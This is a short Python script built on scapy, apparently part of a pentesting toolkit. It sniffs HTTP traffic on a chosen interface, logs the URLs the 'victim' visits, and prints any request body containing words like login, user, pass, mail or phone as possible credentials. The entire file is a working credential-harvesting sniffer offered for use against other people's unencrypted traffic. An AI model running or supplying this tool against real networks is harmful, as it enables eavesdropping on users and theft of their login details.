#!/usr/bin/env python3

import sys
import argparse
import scapy.all as scapy
from colorama import Fore
from scapy.layers import http
from modules.my_utils import show_message
from modules.exit_handler import setup_signal_handler
from modules.sys_utils import check_root

### Functions ########################################################################################################################

def get_arguments():
    parser = argparse.ArgumentParser(description=f'{Fore.GREEN}HTTP Sniffer{Fore.RESET}')
    parser.add_argument("-i", "--interface", dest="interface", required=True, help="Select the interface to sniff (Ex: -i eth0)")

    options = parser.parse_args()
    return options.interface


def process_packet(packet):

    keywords = ["login", "user", "pass", "mail", "phone"]

    if packet.haslayer(http.HTTPRequest):

        url = f"http://{packet[http.HTTPRequest].Host.decode()}{packet[http.HTTPRequest].Path.decode()}"
        show_message("URL visitada por la victima:", "", url)

        if packet.haslayer(scapy.Raw):            
            try:
                response = packet[scapy.Raw].load.decode()

                for keyword in keywords:
                    if keyword in response:
                        show_message("Posibles credenciales:", "info", response)
                        break
            except:
                pass

def sniff(interface):
    scapy.sniff(iface=interface, prn=process_packet, store=0)

### Main Code ########################################################################################################################

def main():
    check_root()
    setup_signal_handler()

    show_message("Executing:", "info", "HTTP Sniffer")

    interface = get_arguments()
    sniff(interface)
    
if __name__ == "__main__":
    main()
